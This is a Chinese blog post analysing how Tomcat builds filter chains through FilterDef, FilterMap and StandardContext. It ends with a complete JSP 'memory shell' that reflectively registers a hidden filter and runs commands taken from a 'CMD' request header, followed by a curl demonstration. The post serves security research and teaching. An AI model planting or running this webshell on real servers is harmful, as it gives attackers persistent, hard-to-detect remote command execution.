---
created: 2024-10-01T07:53:00+00:00
categories:
  - 技术研究
tags:
  - Java安全
updated: 2023-01-01T00:00:00+00:00
date: 2022-10-11T00:00:00+00:00
slug: tomcat-filter-memshell
title: Tomcat Filter型内存马
cover: /img/post/tomcat-filter-memshell/9.png
id: 112906e1-7468-8076-a6e1-c548f280974c
---

## Filter 简介

在 Tomcat 中，Filter（过滤器）是 Java Servlet API 的一部分，用于在请求到达 Servlet 之前或在响应返回客户端之前对请求和响应进行处理。Filter 可以对请求和响应进行修改、记录、验证等操作，它提供了一种灵活的机制来处理 Web 应用中的公共任务。

## Filter 实现

要实现一个 Filter，首先需要创建一个实现 javax.servlet.Filter 接口的类，并实现如下三个方法。

- init(FilterConfig config)：初始化方法，在 Filter 创建时调用。
- doFilter(ServletRequest request, ServletResponse response, FilterChain chain)：主要的过滤逻辑方法，在每次请求时调用。
- destroy()：销毁方法，在 Filter 销毁时调用。

```java
package com.tomcatdemo.filter;

import javax.servlet.*;
import java.io.IOException;

public class FilterDemo implements Filter {
    @Override
    public void init(FilterConfig config) throws ServletException {
        System.out.printf("Filter Init.\n");
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException {
        System.out.printf("Filtering.\n");

        chain.doFilter(request, response);
    }

    @Override
    public void destroy() {
        System.out.printf("Filter Destroy.\n");
    }

}
```

最后，若要在 Web 应用中使用如上 Filter，则需要在 web.xml 文件中定义 Filter 名称、类名以及 URL 映射模式。如下配置意味着 FilterDemo 类将对所有的请求都进行过滤。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">

    <filter>
        <filter-name>FilterDemo</filter-name>
        <filter-class>com.tomcatdemo.filter.FilterDemo</filter-class>
    </filter>
    <filter-mapping>
        <filter-name>FilterDemo</filter-name>
        <url-pattern>/*</url-pattern>
    </filter-mapping>

</web-app>
```

## Filter 处理流程分析

在 IDEA 中配置好 Tomcat，将断点打在 chain.doFilter(request, response)代码行，开始 Debug。

![](/img/post/tomcat-filter-memshell/0.png)

此时，可观察到 chain 已经是一个 ApplicationFilterChain 对象了。

![](/img/post/tomcat-filter-memshell/1.png)

往前回溯，到达 org.apache.catalina.core.ApplicationFilterChain#internalDoFilter:241 处。

![](/img/post/tomcat-filter-memshell/2.png)

在该方法中，通过了一个名为 filterConfig 的 ApplicationFilterConfig 对象遍历获取 filters 中的值，而 filters 则是一个 ApplicationFilterConfig 数组。

```java
private ApplicationFilterConfig[] filters = new ApplicationFilterConfig[0];
```

再往前回溯，到达 org.apache.catalina.core.ApplicationFilterChain#doFilter 方法。

继续往前跟，到达 org.apache.catalina.core.StandardWrapperValve#invoke 方法中，在其中对 filterChain.doFilter 进行了调用。

![](/img/post/tomcat-filter-memshell/3.png)

展开这个 filterChain，可发现其中存放了由我们实现的 FilterDemo 过滤器。

![](/img/post/tomcat-filter-memshell/4.png)

```java
ApplicationFilterChain filterChain = factory.createFilterChain(request, wrapper, servlet);
```

根据如上 filterChain 变量的定义及初始化，接下来便对 org.apache.catalina.core.ApplicationFilterFactory#createFilterChain 方法进行分析。

## 过滤器链创建过程分析

过滤器链用于按顺序应用一组过滤器来处理 HTTP 请求和响应，它是通过 org.apache.catalina.core.ApplicationFilterChain 类来实现的，在 org.apache.catalina.core.ApplicationFilterFactory 中提供了 createFilterChain 方法用来创建过滤器链，所以我们将断点打至此处，重新 Debug。

![](/img/post/tomcat-filter-memshell/5.png)

这个方法的开头对请求的调度类型（REQUEST、FORWARD、INCLUDE）和路径进行了获取，随后对 servlet 进行了 null 判断，如果为 null，则直接返回 null。

```java
// get the dispatcher type
DispatcherType dispatcher = null;
if (request.getAttribute(Globals.DISPATCHER_TYPE_ATTR) != null) {
    dispatcher = (DispatcherType) request.getAttribute(Globals.DISPATCHER_TYPE_ATTR);
}
String requestPath = null;
Object attribute = request.getAttribute(
        Globals.DISPATCHER_REQUEST_PATH_ATTR);

if (attribute != null){
    requestPath = attribute.toString();
}

// If there is no servlet to execute, return null
if (servlet == null)
    return null;
```

然后会根据请求类型是否为 Request 对象以及是否启用了安全性来创建过滤器链对象。

```java
boolean comet = false;

// Create and initialize a filter chain object
ApplicationFilterChain filterChain = null;
if (request instanceof Request) {
    Request req = (Request) request;
    comet = req.isComet();
    if (Globals.IS_SECURITY_ENABLED) {
        // Security: Do not recycle
        filterChain = new ApplicationFilterChain();
        if (comet) {
            req.setFilterChain(filterChain);
        }
    } else {
        filterChain = (ApplicationFilterChain) req.getFilterChain();
        if (filterChain == null) {
            filterChain = new ApplicationFilterChain();
            req.setFilterChain(filterChain);
        }
    }
} else {
    // Request dispatcher in use
    filterChain = new ApplicationFilterChain();
}
```

![](/img/post/tomcat-filter-memshell/6.png)

再然后，设置过滤器链的 Servlet。

```java
filterChain.setServlet(servlet);
filterChain.setSupport(((StandardWrapper)wrapper).getInstanceSupport());
```

之后，就是从 wrapper 中获取父级上下文，即 StandardContext，并根据 StandardContext 调用 findFilterMaps 方法获取过滤器映射，如下图，已经获取到 web.xml 文件中的 filter-mapping 配置。

```java
// Acquire the filter mappings for this Context
StandardContext context = (StandardContext) wrapper.getParent();
FilterMap filterMaps[] = context.findFilterMaps();

// If there are no filter mappings, we are done
if ((filterMaps == null) || (filterMaps.length == 0))
    return filterChain;
```

![](/img/post/tomcat-filter-memshell/7.png)

```xml
<filter-mapping>
    <filter-name>FilterDemo</filter-name>
    <url-pattern>/*</url-pattern>
</filter-mapping>
```

接下来，会对 filterMaps 进行遍历，在遍历过程中会检查过滤器映射的调度类型和 URL 模式，然后通过 StandardContext 的 findFilterConfig 方法获取 filterConfig，并将其添加至过滤器链。如下图，在 filterConfig 中可看到 filterDef，这是对过滤器的定义，其中包含了过滤器的名称和实现类和初始化参数，对应的就是 web.xml 中的 filter 配置。

```java
// Acquire the information we will need to match filter mappings
String servletName = wrapper.getName();

// Add the relevant path-mapped filters to this filter chain
for (FilterMap filterMap : filterMaps) {
    if (!matchDispatcher(filterMap, dispatcher)) {
        continue;
    }
    if (!matchFiltersURL(filterMap, requestPath))
        continue;
    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)
            context.findFilterConfig(filterMap.getFilterName());
    if (filterConfig == null) {
        // FIXME - log configuration problem
        continue;
    }
    boolean isCometFilter = false;
    if (comet) {
        try {
            isCometFilter = filterConfig.getFilter() instanceof CometFilter;
        } catch (Exception e) {
            // Note: The try catch is there because getFilter has a lot of
            // declared exceptions. However, the filter is allocated much
            // earlier
            Throwable t = ExceptionUtils.unwrapInvocationTargetException(e);
            ExceptionUtils.handleThrowable(t);
        }
        if (isCometFilter) {
            filterChain.addFilter(filterConfig);
        }
    } else {
        filterChain.addFilter(filterConfig);
    }
}
```

![](/img/post/tomcat-filter-memshell/8.png)

```xml
<filter>
    <filter-name>FilterDemo</filter-name>
    <filter-class>com.tomcatdemo.filter.FilterDemo</filter-class>
</filter>
```

最后，会再次遍历 filterMaps，在遍历过程中也对调度类型和 servletName 进行了检查，如果通过检查则添加匹配目标 Servlet 名称的过滤器到过滤器链。

最终返回已完成的过滤链。

```java
// Add filters that match on servlet name second
for (FilterMap filterMap : filterMaps) {
    if (!matchDispatcher(filterMap, dispatcher)) {
        continue;
    }
    if (!matchFiltersServlet(filterMap, servletName))
        continue;
    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)
            context.findFilterConfig(filterMap.getFilterName());
    if (filterConfig == null) {
        // FIXME - log configuration problem
        continue;
    }
    boolean isCometFilter = false;
    if (comet) {
        try {
            isCometFilter = filterConfig.getFilter() instanceof CometFilter;
        } catch (Exception e) {
            // Note: The try catch is there because getFilter has a lot of
            // declared exceptions. However, the filter is allocated much
            // earlier
        }
        if (isCometFilter) {
            filterChain.addFilter(filterConfig);
        }
    } else {
        filterChain.addFilter(filterConfig);
    }
}

// Return the completed filter chain
return filterChain;
```

![](/img/post/tomcat-filter-memshell/9.png)

通过对 createFilterChain 方法的分析，可得知在创建过滤器链前必须要先获取到 StandradContext，根据 StandradContext 获取到 filterConfigs，并对 FilterMap 和 FilterDef 进行添加。

## FilterDef 与 FilterMap

FilterDef 和 FilterMap 是 Tomcat 中用于定义和映射过滤器的两个关键类，它们共同作用于过滤器的配置和执行。

### FilterDef

FilterDef 用于定义一个过滤器，它包含过滤器的基本信息，如过滤器的名称、实现类和初始化参数。每一个 FilterDef 对象代表一个特定的过滤器定义。

这个类在 Tomcat 7 版本中是 org.apache.catalina.deploy.FilterDef，而在 Tomcat 8 版本中则是 org.apache.tomcat.util.descriptor.web.FilterDef。

如下是它的一些相关字段与方法，其中 filter 是要关联的过滤器实例，FilterDef 类提供了 setFilter 方法用于设置与此 FilterDef 相关联的过滤器实例；filterClass 是过滤器类的全限定名，表示该过滤器的具体实现类，setFilterClass 方法用于设置 Filter 类的全限定名；filterName 是过滤器的名称，setFilterName 方法用于设置过滤器名称。

```java
/**
 * The filter instance associated with this definition
 */
private transient Filter filter = null;

public Filter getFilter() {
    return filter;
}

public void setFilter(Filter filter) {
    this.filter = filter;
}

/**
 * The fully qualified name of the Java class that implements this filter.
 */
private String filterClass = null;

public String getFilterClass() {
    return (this.filterClass);
}

public void setFilterClass(String filterClass) {
    this.filterClass = filterClass;
}

/**
 * The name of this filter, which must be unique among the filters
 * defined for a particular web application.
 */
private String filterName = null;

public String getFilterName() {
    return (this.filterName);
}

public void setFilterName(String filterName) {
    if (filterName == null || filterName.equals("")) {
        throw new IllegalArgumentException(
                sm.getString("filterDef.invalidFilterName", filterName));
    }
    this.filterName = filterName;
}
```

### FilterMap

FilterMap 用于定义过滤器的映射关系，指定过滤器应用到哪些 URL 模式或 Servlet 上。每一个 FilterMap 对象代表一个过滤器与特定 URL 模式或 Servlet 名称的映射关系。

这个类在 Tomcat 7 与 8 版本中，分别是 org.apache.catalina.deploy.FilterMap 与 org.apache.tomcat.util.descriptor.web.FilterMap。

在 FilterMap 中存在如下字段与方法，在编写内存马的时候会用到。首先是 filterName，过滤器的名称，提供了 setFilterName 用于设置过滤器的名称；其次是过滤器应用的 URL 模式 urlPatterns，提供了 addURLPattern 方法用于添加过滤器应用的 URL 模式；最后是 setDispatcher 方法，用于设置过滤器应用的调度类型，有转发请求（FORWARD）、包含请求（INCLUDE）、直接请求（REQUEST）、错误请求（ERROR）和异步（ASYNC）等五种类型。

```java
private String filterName = null;

public String getFilterName() {
    return (this.filterName);
}

public void setFilterName(String filterName) {
    this.filterName = filterName;
}

/**
 * The URL pattern this mapping matches.
 */
private String[] urlPatterns = new String[0];

public String[] getURLPatterns() {
    if (matchAllUrlPatterns) {
        return new String[] {};
    } else {
        return (this.urlPatterns);
    }
}

public void addURLPattern(String urlPattern) {
    if ("*".equals(urlPattern)) {
        this.matchAllUrlPatterns = true;
    } else {
        String[] results = new String[urlPatterns.length + 1];
        System.arraycopy(urlPatterns, 0, results, 0, urlPatterns.length);
        results[urlPatterns.length] = RequestUtil.URLDecode(urlPattern);
        urlPatterns = results;
    }
}

/**
 *
 * This method will be used to set the current state of the FilterMap
 * representing the state of when filters should be applied.
 */
public void setDispatcher(String dispatcherString) {
    String dispatcher = dispatcherString.toUpperCase(Locale.ENGLISH);

    if (dispatcher.equals(DispatcherType.FORWARD.name())) {
        // apply FORWARD to the global dispatcherMapping.
        dispatcherMapping |= FORWARD;
    } else if (dispatcher.equals(DispatcherType.INCLUDE.name())) {
        // apply INCLUDE to the global dispatcherMapping.
        dispatcherMapping |= INCLUDE;
    } else if (dispatcher.equals(DispatcherType.REQUEST.name())) {
        // apply REQUEST to the global dispatcherMapping.
        dispatcherMapping |= REQUEST;
    }  else if (dispatcher.equals(DispatcherType.ERROR.name())) {
        // apply ERROR to the global dispatcherMapping.
        dispatcherMapping |= ERROR;
    }  else if (dispatcher.equals(DispatcherType.ASYNC.name())) {
        // apply ERROR to the global dispatcherMapping.
        dispatcherMapping |= ASYNC;
    }
}
```

## StandardContext

org.apache.catalina.core.StandardContext 类是 Tomcat 中的一个核心组件，表示一个 Web 应用的上下文。它负责管理 Web 应用的所有组件，包括 Servlet、Filter 和 Listener 等。在 Filter 方法，StandardContext 通过 FilterDef 和 FilterMap 来管理过滤器的定义和映射。

在 StandardContext 类中提供了 addFilterDef 方法用于将一个 FilterDef 添加到当前上下文中。

```java
/**
 * Add a filter definition to this Context.
 *
 * @param filterDef The filter definition to be added
 */
@Override
public void addFilterDef(FilterDef filterDef) {

    synchronized (filterDefs) {
        filterDefs.put(filterDef.getFilterName(), filterDef);
    }
    fireContainerEvent("addFilterDef", filterDef);

}
```

addFilterMapBefore 方法用于在当前上下文中添加一个 FilterMap，并确保该映射插入在 web.xml 中定义的映射之前，这样便可以实现对过滤器执行顺序的控制，特别是在需要优先处理某些过滤器的情况下，例如在利用 Filter 内存马攻击 Shiro 应用的场景下。

```java
/**
 * Add a filter mapping to this Context before the mappings defined in the
 * deployment descriptor but after any other mappings added via this method.
 *
 * @param filterMap The filter mapping to be added
 *
 * @exception IllegalArgumentException if the specified filter name
 *  does not match an existing filter definition, or the filter mapping
 *  is malformed
 */
@Override
public void addFilterMapBefore(FilterMap filterMap) {
    validateFilterMap(filterMap);
    // Add this filter mapping to our registered set
    filterMaps.addBefore(filterMap);
    fireContainerEvent("addFilterMap", filterMap);
}
```

## Filter 型内存马实现

根据如上，我们编写如下 jsp 内存马，将其上传至 Web 应用，并访问执行。

```jsp
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>

<%
    final String filterName = "F!lter"+System.nanoTime()%100000000L;
    org.apache.catalina.core.StandardContext standardContext = null;

    ServletContext servletContext = request.getSession().getServletContext();

    Field contextField = servletContext.getClass().getDeclaredField("context");
    contextField.setAccessible(true);

    org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext);
    contextField = applicationContext.getClass().getDeclaredField("context");
    contextField.setAccessible(true);

    standardContext = (org.apache.catalina.core.StandardContext) contextField.get(applicationContext);

    Field filterConfigsfield = standardContext.getClass().getDeclaredField("filterConfigs");
    filterConfigsfield.setAccessible(true);
    Map map = (Map) filterConfigsfield.get(standardContext);

    if (map.get(filterName) == null){
        Filter filter = new Filter() {
            @Override
            public void init(FilterConfig filterConfig) throws ServletException {
            }

            @Override
            public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws IOException, ServletException {
                HttpServletRequest request = (HttpServletRequest)req;
                HttpServletResponse response = (HttpServletResponse)resp;
                String cmd = request.getHeader("CMD");
                String osTyp;
                if (cmd != null && !cmd.isEmpty()) {
                    boolean isLinux = true;
                    osTyp = System.getProperty("os.name");
                    if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                        isLinux = false;
                    }

                    String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                    InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                    Scanner s = (new Scanner(in)).useDelimiter("\\a");
                    String output = s.hasNext() ? s.next() : "";
                    PrintWriter out = response.getWriter();
                    out.println(output);
                    out.flush();
                    out.close();
                } else {
                    chain.doFilter(req, resp);
                }
            }

            @Override
            public void destroy() {
            }
        };

        // 获取 FilterDef，兼容Tomcat 7和8
        Class filterDefClass = null;
        try{
            // 8
            filterDefClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
        }catch(Exception e){
            // 7
            filterDefClass = Class.forName("org.apache.catalina.deploy.FilterDef");
        }

        Object filterDef = filterDefClass.newInstance();
        filterDef.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterDef, new Object[]{filterName});

        filterDef.getClass().getDeclaredMethod("setFilterClass", new Class[]{String.class}).invoke(filterDef, new Object[]{filter.getClass().getName()});
        filterDef.getClass().getDeclaredMethod("setFilter", new Class[]{Filter.class}).invoke(filterDef, new Object[]{filter});
        standardContext.getClass().getDeclaredMethod("addFilterDef", new Class[]{filterDefClass}).invoke(standardContext, new Object[]{filterDef});

        // 获取 FilterMap，，兼容Tomcat 7和8
        Class filterMapClass = null;
        try {
            // Tomcat 8
            filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
        } catch (Exception e) {
            // Tomcat 7
            filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
        }

        Object filterMap = filterMapClass.newInstance();
        filterMap.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterMap, new Object[]{filterName});
        filterMap.getClass().getDeclaredMethod("setDispatcher", new Class[]{String.class}).invoke(filterMap, new Object[]{DispatcherType.REQUEST.name()});
        filterMap.getClass().getDeclaredMethod("addURLPattern", new Class[]{String.class}).invoke(filterMap, new Object[]{"/*"});

        //调用 addFilterMapBefore 会自动加到队列的最前面，不需要原来的手工去调整顺序了
        standardContext.getClass().getDeclaredMethod("addFilterMapBefore", new Class[]{filterMapClass}).invoke(standardContext, new Object[]{filterMap});

        //设置 FilterConfig
        Constructor constructor = org.apache.catalina.core.ApplicationFilterConfig.class.getDeclaredConstructor(new Class[]{org.apache.catalina.Context.class, filterDefClass});
        constructor.setAccessible(true);
        org.apache.catalina.core.ApplicationFilterConfig filterConfig = (org.apache.catalina.core.ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);

        try {
            map.put(filterName, filterConfig);
            response.getWriter().write("Filter Mem Shell Successful Injection :)");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
%>
```

最后验证如下，成功注入 Filter 型内存马并成功执行命令。

```bash
# curl http://192.168.1.102:7788/filterMemShell.jsp && curl http://192.168.1.102:7788/ -H "CMD: pwd"
Filter Mem Shell Successful Injection :)

/opt/apache-tomcat/apache-tomcat-7.0.109/bin
```